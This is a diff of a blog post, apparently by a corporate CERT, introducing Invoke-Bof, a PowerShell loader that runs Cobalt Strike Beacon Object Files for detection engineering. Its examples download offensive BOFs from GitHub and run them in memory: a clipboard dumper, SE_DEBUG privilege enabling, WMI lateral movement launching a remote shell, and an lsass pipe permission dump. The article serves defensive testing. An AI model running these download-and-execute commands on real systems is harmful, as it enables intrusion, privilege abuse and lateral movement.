@@ -1,117 +1,32 @@
 ---
 title: "Invoke-Bof"
-date: 2021-12-08T09:22:42+02:00
-Summary: Invoke-Bof, Is it a kind of purple software?
+date: 2021-12-09T09:22:42+02:00
+Summary: Invoke-Bof, a kind of purple software?
 ---
 
-CobaltStrike appears to be the favoured offensive framework, used by a large majority of the offensive side of cybersecurity.
+All the rage of advanced Red Teamers is now to develop offensive modules as [BOF](https://download.cobaltstrike.com/help-beacon-object-files) modules, short for *Beacon Object File*.
 
-The framework is very extensible and allows Red Teamers to develop specific offensive modules named BOF, short for Beacon Object File. Beacons are what CobaltStrike calls their agents, or final payloads.
-
-A Beacon Object File is split into two parts:
+A *Beacon Object File* is split into two parts:
 
 - A payload that will be executed on the victim machine
 - An aggressor script, which will prepare and interact with the payload
 
-Many Red Teams publish BOFs on their public GitHub repositories, implementing lateral movement, vulnerability, attack, or persistence. Instead of reimplementing these techniques each time we want to try and detect them, We decided to find a way to execute them directly.
+The Red Team community is prolific: tens of BOF modules are available on GitHub, from lateral movement to advanced persistence technique. As detection engineers, how can we execute them easily to observe their artefacts?
 
-We decided to implement a BOF loader in powershell, [invoke-Bof](https://github.com/airbus-cert/Invoke-Bof) to be easily included in any framework, and especially the wonderful work done by Redcanary with [atomic-red-team](https://github.com/redcanaryco/atomic-red-team) !!!
+In this frame, we designed a BOF loader in powershell, [Invoke-Bof](https://github.com/airbus-cert/Invoke-Bof) to be easily included in any framework, such as the wonderful one from RedCanary, [atomic-red-team](https://github.com/redcanaryco/atomic-red-team)!
 
-# What Is a BOF payload?
 
-A BOF payload is simply an object file produced by any C compiler. An Object file is an intermediate file where the linking part is not yet done. So in essence, a BOF payload is written in C!
+# Example of use cases
 
-As the linker is not done, no API call is resolved, and that is the genius of the CobalStrike developers! The linking process will be done directly during the loading step on the victim machine. It saves a lot of space and keeps the BOF very small!
+Most of the time, we want to execute a BOF while instrumenting the OS to find the right EventID, ETW or artefacts. Let's go through a few examples available from Github.
 
-Intermediate object files are not PE files, but in COFF format. The COFF format includes enough information to load and execute the payload:
+## BOF_dumpclip
 
-- Section Size and rights
-- Symbols, especially exported function names
-- Relocation information
-
-Most of the time, a BOF file needs to interact with the C&C, so CobaltStrike offers a dedicated API:
-
-- BeaconFormatXXX for format API used to send raw information to the C&C
-- BeaconDataXXX is used to retrieve information from the C&C
-- BeaconPrintf and BeaconOutput is used to send information to C&C
-
-Many other offensive APIs, to perform process manipulation, token manipulation etc...
-So here is the challenge, as Powershell is a managed language, which means it is executed using CLR (Common Language Runtime) in Windows, we need to perform a smart interface to switch from managed to unmanaged and from unmanaged to managed world.
-
-# Managed to Unmanaged
-
-A BOF payload is simply an object file produced by any C compiler. An Object file is an intermediate file where the linking part is not yet done. So in essence, a BOF payload is written in C!
-
-As the linker is not done, no API call is resolved, and that is the genius of the CobalStrike developers! The linking process will be done directly during the loading step on the victim machine. It saves a lot of space and keeps the BOF very small!
-
-Intermediate object files are not PE files, but in COFF format. The COFF format includes enough information to load and execute the payload:
-
-* Section Size and rights
-* Symbols, especially exported function names
-* Relocation information
-
-Most of the time, a BOF file needs to interact with the C&C, so CobaltStrike offers a dedicated API:
-
-* `BeaconFormatXXX` for format API use to send raw information to the C&C
-* `BeaconDataXXX` is used to retrieve information from the C&C
-* `BeaconPrintf` and `BeaconOutput` is used to send information to C&C
-* Many other offensive APIs, to perform process manipulation, token manipulation etc...
-
-So here is the challenge, as Powershell is a managed language, which means it is executed using CLR (Common Language Runtime) in Windows, we need to perform a smart interface to switch from managed to unmanaged and from unmanaged to managed world.
-
-# Unmanaged to managed
-
-Now we can launch our beacon, but there is the interaction between the unmanaged and managed world. For example, the Beacon API is used by many beacon developers to perform parameter unmarshalling, or send information to the C&C.
-
-The main problem is finding a way to declare a typed function that can be easily marshaled by the CLR.
-
-The solution comes directly from Powershell itself, by providing a way to declare a typed function. It’s a feature introduced in Powershell 5.0, so it’s an allowed restriction.
-
-```powershell
-class BeaconAPI {
-	static [void] BeaconDataParse([IntPtr] $Parser, [IntPtr] $Buffer, [int] $Size)
-	{
-		$ParserObject = [System.Runtime.InteropServices.Marshal]::PtrToStructure($Parser, [Type]$script:BeaconTypes.datap)
-		$ParserObject.original = $Buffer
-		$ParserObject.buffer = $Buffer
-		$ParserObject.size = $Size
-		$ParserObject.length = 0
-		[System.Runtime.InteropServices.Marshal]::StructureToPtr($ParserObject, $Parser, $false)
-	}
-}
-
-$BeaconAPI = New-Object System.Object
-
-$BeaconDataParseDelegate = [System.Delegate]::CreateDelegate([Type](Get-DelegateType @([IntPtr], [IntPtr], [int]) ([void])), [BeaconAPI].GetMethod("BeaconDataParse"))
-$BeaconAPI | Add-Member -MemberType NoteProperty -Name BeaconDataParse -Value ($BeaconDataParseDelegate)
-```
-
-Last, but not least, limitation comes from CLR. The Beacon API uses a lot of varargs functions (the ones that end with `...`), especially BeaconPrintf API. So as CLR can’t handle varargs as C API does, and once we are in the managed world we no longer have access to the original stack, we can only rely on the register parameters. 
-In x64 the calling convention uses registers for the fourth first parameter, so as BeaconPrintf uses the first for the logging level, and the second for the string format, we only have two possibles varargs arguments.
-Most of the developers only use one or two varargs arguments, so it’s an acceptable limitation.
-
-# Example of use case
-
-## Dump clipboard
-
-Now we can launch every beacon available from Github. For example, we can test a beacon that dumps our clipboard:
+This one dumps our clipboard:
 
 ```
 > $BOFBytes = (Invoke-WebRequest -Uri "https://github.com/DallasFR/BOF_dumpclip/raw/main/dump.o").Content
 > Invoke-Bof -BOFBytes $BOFBytes -EntryPoint go
-
-
-
-██╗███╗   ██╗██╗   ██╗ ██████╗ ██╗  ██╗███████╗    ██████╗  ██████╗ ███████╗
-██║████╗  ██║██║   ██║██╔═══██╗██║ ██╔╝██╔════╝    ██╔══██╗██╔═══██╗██╔════╝
-██║██╔██╗ ██║██║   ██║██║   ██║█████╔╝ █████╗█████╗██████╔╝██║   ██║█████╗  
-██║██║╚██╗██║╚██╗ ██╔╝██║   ██║██╔═██╗ ██╔══╝╚════╝██╔══██╗██║   ██║██╔══╝  
-██║██║ ╚████║ ╚████╔╝ ╚██████╔╝██║  ██╗███████╗    ██████╔╝╚██████╔╝██║     
-╚═╝╚═╝  ╚═══╝  ╚═══╝   ╚═════╝ ╚═╝  ╚═╝╚══════╝    ╚═════╝  ╚═════╝ ╚═╝     
-                                               
-  [v0.1 Made with love by CERT https://github.com/airbus-cert]
-
-
 
 [+] Mapping of .text    at  0x133e0c20000
 [+] Mapping of .rdata   at  0x133e0c30000
@@ -127,29 +42,15 @@ Invoke-Bof -BOFBytes $BOFBytes  -EntryPoint go
 ----------------------------------
 
 ****************************************************************************
-
 ```
 
-## Enable privileges
-We can try to detect an attacker that tries to enable *SE_DEBUG* privilege:
+## Toggle_Token_Privileges_BOF
+
+Enable *SE_DEBUG* privilege:
 
 ```
 > $BOFBytes = (Invoke-WebRequest -Uri "https://github.com/EspressoCake/Toggle_Token_Privileges_BOF/raw/main/dist/toggle_privileges_bof.x64.o").Content
 > Invoke-Bof -BOFBytes $BOFBytes -EntryPoint enable -ArgumentList 20
-
-
-
-██╗███╗   ██╗██╗   ██╗ ██████╗ ██╗  ██╗███████╗    ██████╗  ██████╗ ███████╗
-██║████╗  ██║██║   ██║██╔═══██╗██║ ██╔╝██╔════╝    ██╔══██╗██╔═══██╗██╔════╝
-██║██╔██╗ ██║██║   ██║██║   ██║█████╔╝ █████╗█████╗██████╔╝██║   ██║█████╗  
-██║██║╚██╗██║╚██╗ ██╔╝██║   ██║██╔═██╗ ██╔══╝╚════╝██╔══██╗██║   ██║██╔══╝  
-██║██║ ╚████║ ╚████╔╝ ╚██████╔╝██║  ██╗███████╗    ██████╔╝╚██████╔╝██║     
-╚═╝╚═╝  ╚═══╝  ╚═══╝   ╚═════╝ ╚═╝  ╚═╝╚══════╝    ╚═════╝  ╚═════╝ ╚═╝     
-                                               
-  [v0.1 Made with love by Aircraft Company CERT https://github.com/airbus-cert]
-
-
-
 [+] Mapping of .text    at  0x133e0ab0000
 [+] Mapping of .data    at  0x133e0bf0000
 [+] Mapping of .xdata   at  0x133e0c20000
@@ -165,28 +66,15 @@ Authors:
 You are not currently in an administrative session. Come again later!
 
 ****************************************************************************
-
-
 ```
 
 ## Lateral movement using WMI
-You want to execute a process using WMI create process:
+
+Execute a process using WMI create process:
 
 ```
 > $BOFBytes = (Invoke-WebRequest -Uri "https://github.com/Yaxser/CobaltStrike-BOF/raw/master/WMI%20Lateral%20Movement/ProcCreate.x64.o").Content
 > Invoke-Bof -BOFBytes $BOFBytes -EntryPoint go -ArgumentList "\\COMPUTER\ROOT\CIMV2","domain","username","username","cmd.exe /C powershell.exe",1 -UnicodeStringParameter
-
-
-██╗███╗   ██╗██╗   ██╗ ██████╗ ██╗  ██╗███████╗    ██████╗  ██████╗ ███████╗
-██║████╗  ██║██║   ██║██╔═══██╗██║ ██╔╝██╔════╝    ██╔══██╗██╔═══██╗██╔════╝
-██║██╔██╗ ██║██║   ██║██║   ██║█████╔╝ █████╗█████╗██████╔╝██║   ██║█████╗
-██║██║╚██╗██║╚██╗ ██╔╝██║   ██║██╔═██╗ ██╔══╝╚════╝██╔══██╗██║   ██║██╔══╝
-██║██║ ╚████║ ╚████╔╝ ╚██████╔╝██║  ██╗███████╗    ██████╔╝╚██████╔╝██║
-╚═╝╚═╝  ╚═══╝  ╚═══╝   ╚═════╝ ╚═╝  ╚═╝╚══════╝    ╚═════╝  ╚═════╝ ╚═╝
-
-  [v0.1 Made with love by Aircraft Company CERT https://github.com/airbus-cert]
-
-
 
 [+] Mapping of .text at  0x2e940940000
 [+] Mapping of /4 at  0x2e95a880000
@@ -225,23 +113,9 @@ ExecMethod Succeeded!
 
 ## Dump permission of a pipe
 
-
-
 ```
 > $BOFBytes = (Invoke-WebRequest -Uri "https://github.com/boku7/xPipe/raw/main/xpipe.o").Content
 > Invoke-Bof -BOFBytes $BOFBytes -EntryPoint go -ArgumentList "\\.\pipe\lsass" -UnicodeStringParameter
-
-
-██╗███╗   ██╗██╗   ██╗ ██████╗ ██╗  ██╗███████╗    ██████╗  ██████╗ ███████╗
-██║████╗  ██║██║   ██║██╔═══██╗██║ ██╔╝██╔════╝    ██╔══██╗██╔═══██╗██╔════╝
-██║██╔██╗ ██║██║   ██║██║   ██║█████╔╝ █████╗█████╗██████╔╝██║   ██║█████╗
-██║██║╚██╗██║╚██╗ ██╔╝██║   ██║██╔═██╗ ██╔══╝╚════╝██╔══██╗██║   ██║██╔══╝
-██║██║ ╚████║ ╚████╔╝ ╚██████╔╝██║  ██╗███████╗    ██████╔╝╚██████╔╝██║
-╚═╝╚═╝  ╚═══╝  ╚═══╝   ╚═════╝ ╚═╝  ╚═╝╚══════╝    ╚═════╝  ╚═════╝ ╚═╝
-
-  [v0.1 Make with love by Aircraft Company CERT https://github.com/airbus-cert]
-
-
 
 [+] Mapping of .text at  0x16e54590000
 [+] Mapping of .rdata at  0x16e545a0000
@@ -272,5 +146,57 @@ ExecMethod Succeeded!
 00000120   45 41 54 45 5F 50 49 50 45 5F 49 4E 53 54 41 4E  EATE_PIPE_INSTAN
 00000130   43 45 0A                                         CE.
 ============================================================================
-****************************************************************************
 ```
+
+# How it works?
+## What is a BOF payload?
+
+A BOF payload is a simple object file produced by a C compiler. An Object file (`.o`) is an intermediate file which was not linked. That's why most (all?) BOF payloads are written in C!
+
+As the linker is not done, API call are not resolved, and that is the genius of the CobalStrike developers: The BOF will be linked on-the-fly by the victim machine. Consequently, it saves a lot of space and keeps the BOF tiny, this can make a big difference when using bandwidth constrained channels, such as DNS.
+
+## Managed to Unmanaged
+
+Object files are COFF files, not PE. The COFF format includes enough information to load and execute the payload:
+
+- Section Size and rights
+- Symbols, especially exported function names
+- Relocation information
+
+Most of the time, a BOF needs to interact with the C&C, so CobaltStrike offers a dedicated API:
+
+- `BeaconFormatXXX` to send raw information to the C&C
+- `BeaconDataXXX` to retrieve information from the C&C
+- `BeaconPrintf` and `BeaconOutput` to send information to C&C
+- And many other offensive APIs, to perform process or token manipulation, etc...
+
+Powershell being a managed language, powered by the CLR (Common Language Runtine), the challenge is to switch from managed to unmanaged world and from unmanaged to managed world.
+
+## Unmanaged to managed
+
+The other way around now, go from the unmanaged (BOF) to the managed world (Powershell): BOFs often use the Beacon API to perform parameter unmarshalling, or send information to the C&C. How can we declare a typed function that can be easily marshaled by the CLR?
+
+The solution comes directly from Powershell itself, using typed functions (new feature from PS 5.0):
+
+```powershell
+class BeaconAPI {
+	static [void] BeaconDataParse([IntPtr] $Parser, [IntPtr] $Buffer, [int] $Size)
+	{
+		$ParserObject = [System.Runtime.InteropServices.Marshal]::PtrToStructure($Parser, [Type]$script:BeaconTypes.datap)
+		$ParserObject.original = $Buffer
+		$ParserObject.buffer = $Buffer
+		$ParserObject.size = $Size
+		$ParserObject.length = 0
+		[System.Runtime.InteropServices.Marshal]::StructureToPtr($ParserObject, $Parser, $false)
+	}
+}
+
+$BeaconAPI = New-Object System.Object
+
+$BeaconDataParseDelegate = [System.Delegate]::CreateDelegate([Type](Get-DelegateType @([IntPtr], [IntPtr], [int]) ([void])), [BeaconAPI].GetMethod("BeaconDataParse"))
+$BeaconAPI | Add-Member -MemberType NoteProperty -Name BeaconDataParse -Value ($BeaconDataParseDelegate)
+```
+
+Unfortunately, it comes with a subtle limit: typed functions do not have a stack, and thus, it cannot support `va_arg` parameters. And that's a shame because the BOF API uses them, such as a simple `BeaconPrintf`. 
+
+Luckily, most of the developers only use one or two `var_args`, which fits accidentally with the x86_64 calling convention (using registers for the four first parameters) as `BeaconPrintf` uses the first argument for the logging level, and the second for the string format, we only have two possibles varargs arguments.
